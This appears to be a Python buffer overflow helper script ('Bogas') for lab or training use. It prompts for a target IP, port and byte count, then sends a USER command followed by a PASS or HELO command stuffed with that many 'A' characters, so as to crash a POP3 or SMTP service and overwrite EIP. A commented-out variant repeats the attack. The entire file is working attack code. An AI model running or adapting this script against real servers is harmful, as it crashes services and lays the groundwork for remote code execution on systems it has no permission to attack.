#!/usr/bin/python3.6
null    = """
written by coolhandsquid
Bogas
Buffer Overflow Generater Automatic Semi
"""

import socket

print("The purpose of this step is to verify how much data (bytes) we need to send to the application to break it and overwrite EIP.")
ipaddr  = input("What is the ip of the machine you are trying to replicate the attack on?\n> ")
portnum = input("What is the port number of the application you are trying to replicate the attack of?\n> ")
portnum	= int(portnum)
bytes	= input("How many bytes (letters) would you like to send (info from S1Fuzzing.)\n> " )
bytes	= int(bytes)
s       = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer	= 'A' * bytes
service_greeting        = "PASS "
if portnum      == 25:
	service_greeting        = "HELO "
elif portnum    == 110:
	service_greeting        = "PASS "


try:
	print("\nSending evil buffer...")
	s.connect((ipaddr, portnum))
	data = s.recv(1024)
	a	= "USER username" + "\r\n"
	s.send(a.encode())
	data = s.recv(1024)
	b	= service_greeting + buffer +"\r\n"
	s.send(b.encode())
	print("\nDone!")
except:
	print("Could not connect to POP3!")
"""
try:
	print("\nSending evil buffer...")
	connect	= s.connect((ipaddr, portnum))
	s.recv(1024)
	a	= "USER username" + "\r\n"
	s.send(a.encode())
	s.recv(1024)
	b	= "HELO " + buffer + "\r\n"
	s.send(b.encode())
	c	= "QUIT\r\n"
	s.send(c.encode())
	s.close()
except:
	print("Could not connect to server")
"""
